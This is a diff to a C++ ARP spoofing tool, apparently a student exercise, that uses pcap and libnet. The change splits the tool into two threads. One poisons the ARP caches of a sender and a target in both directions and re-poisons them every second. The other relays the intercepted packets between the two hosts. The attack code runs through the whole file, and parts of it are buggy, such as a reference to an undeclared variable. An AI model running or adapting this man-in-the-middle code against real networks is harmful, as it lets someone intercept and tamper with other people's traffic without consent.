@@ -23,8 +23,10 @@
 
 #define MTU 1500
 
+std::mutex ip_to_mac_mutex;
 std::map<std::string, std::string> ip_to_mac;
 static std::mutex m;
+
 #pragma pack(push, 1)
 struct EthArpPacket final {
     EthHdr eth_;
@@ -106,6 +108,7 @@ void ip_to_mac_init(Ip mip,Mac mmac){
     std::string modified_ip=p.first;
     std::string modified_mac=p.second;
     if(ip_to_mac.find(modified_ip) == ip_to_mac.end()) {
+        std::lock_guard<std::mutex> lock(ip_to_mac_mutex);
         ip_to_mac[modified_ip] = modified_mac;
     }
 }
@@ -132,9 +135,6 @@ bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
         if(ip_to_mac.find(static_cast<std::string>(recvPacket->arp_.sip_)) == ip_to_mac.end()){ 
             ip_to_mac_init(htonl(recvPacket->arp_.sip_),recvPacket->arp_.smac_);
         } 
-        if(ip_to_mac.find(static_cast<std::string>(recvPacket->arp_.tip_)) == ip_to_mac.end()){ 
-            ip_to_mac_init(htonl(recvPacket->arp_.tip_),recvPacket->arp_.tmac_);
-        }
         if (ntohs(recvPacket->eth_.type_) != EthHdr::Arp) {
             continue;
         }
@@ -149,6 +149,8 @@ bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
         
         memcpy(&packet.arp_.tmac_, &recvPacket->arp_.smac_, MAC_SIZE); 
         memcpy(&packet.eth_.dmac_, &recvPacket->eth_.smac_, MAC_SIZE);
+
+
         return true;
     }
 }
@@ -215,12 +217,12 @@ bool check_spoofed(pcap_t* handle) {
     while(1){
         int res = pcap_next_ex(handle, &header,&packet);
         if (res==0){
-            return false;
+            continue;
         }
         eth_hdr = (struct libnet_ethernet_hdr*)(packet);
         // If it's not an ARP packet, exit the function
         if(ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP)
-            return false;
+            continue;
         printf("첫 번째 지나감\n");
         break;
     }    
@@ -261,11 +263,27 @@ void reInfect(pcap_t* handle,const char* dev,const char* sI,const char* tI){
         printf("no spoofed\n");
         sendArpSpoof(handle,dev,sI,tI);
         printf("ip_to_mac is : %s\n\n",ip_to_mac[std::string(sI)].c_str());
-        
     }
 }
-
-void relay_packet(pcap_t* handle,const char* dev,const char* sI,const char* tI) {
+bool convert_mac(const char* mac_str, uint8_t* mac_bytes) {
+    int values[6];
+    if (6 == sscanf(mac_str, "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
+        for (int i = 0; i < 6; ++i) {
+            mac_bytes[i] = (uint8_t) values[i];
+        }
+        return true;
+    } else {
+        return false; // Failed to parse MAC address
+    }
+}
+void relay_thread(const char* dev,const char* sI,const char* tI) {
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (handle == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+        return;
+    }    
+    
     struct pcap_pkthdr* header;  // header pcap gives us
     const u_char *packet;       // actual packet
 
@@ -273,7 +291,6 @@ void relay_packet(pcap_t* handle,const char* dev,const char* sI,const char* tI) 
 
     while (1) {
         m.lock();
-        reInfect(handle,dev,sI,tI);
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0){ 
             printf("res error\n");
@@ -320,9 +337,17 @@ void relay_packet(pcap_t* handle,const char* dev,const char* sI,const char* tI) 
         }
 
         const char* d_mac = ip_to_mac[std::string(tI)].c_str();
-        std::cout << "mac addr is "<< ip_to_mac[std::string(tI)]<<"\n";
-        memcpy(eth_hdr->ether_dhost,d_mac,6);
-        memcpy(eth_hdr->ether_shost, m_mac, 6);
+	std::cout << "d_mac is " << d_mac << std::endl;
+        std::cout << "mac addr is "<< ip_to_mac[std::string(dst_ip)].c_str()<<"\n";
+ 
+	uint8_t d_bytes[6];
+	uint8_t s_bytes[6];
+	if (convert_mac(d_mac, d_bytes)) {
+    		memcpy(eth_hdr->ether_dhost, d_bytes, 6);
+	} else {
+   	printf("Failed to convert MAC addresses.\n");
+	}
+
         free(m_mac);         
         //send to target
 
@@ -341,19 +366,26 @@ void relay_packet(pcap_t* handle,const char* dev,const char* sI,const char* tI) 
         m.unlock();
         printf("good!\n");
     }
+    pcap_close(handle);
 }
-
-void run(const char* dev,const char* sI,const char* tI){
+void arp_check_thread(const char* dev, const char* sI, const char* tI) {
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    pcap_t* handle=pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return;
     }
     sendArpSpoof(handle,dev,sI,tI);
-    relay_packet(handle,dev,sI,tI);
-    pcap_close(handle); // 
+    sendArpSpoof(handle,dev,tI,sI);
+    while (true) {
+        if (check_spoofed(handle)==false) {
+            reInfect(handle, dev, sI, tI);
+        }
+        std::this_thread::sleep_for(std::chrono::seconds(1)); // 10초마다 확인합니다. 필요에 따라 조절 가능합니다.
+    }
+    pcap_close(handle);
 }
+
 bool isValidIP(const std::string& ip) {
     std::istringstream iss(ip);
     std::string segment;
@@ -411,15 +443,16 @@ int main(int argc, char* argv[]) {
 
     char* dev = argv[1];
 
-    // Thread화
-    std::vector<std::thread> work;
+    std::vector<std::thread> arp_check_threads;
+    std::vector<std::thread> relay_threads;
     for(int i=0;i<senders.size();i++){
-        //init(myPacket[i],senderIp[i].c_str,targetIp[i].c_str);
-        work.push_back(std::thread(run,dev,senders[i].c_str(),targets[i].c_str()));
+        arp_check_threads.push_back(std::thread(arp_check_thread,dev,senders[i].c_str(),targets[i].c_str()));
+        relay_threads.push_back(std::thread(relay_thread,dev,senders[i].c_str(),targets[i].c_str()));
 
     }
     for(int i=0;i<senders.size();i++){
-        work[i].join();
+        arp_check_threads[i].join();
+        relay_threads[i].join();
     }
     return 0;
 }
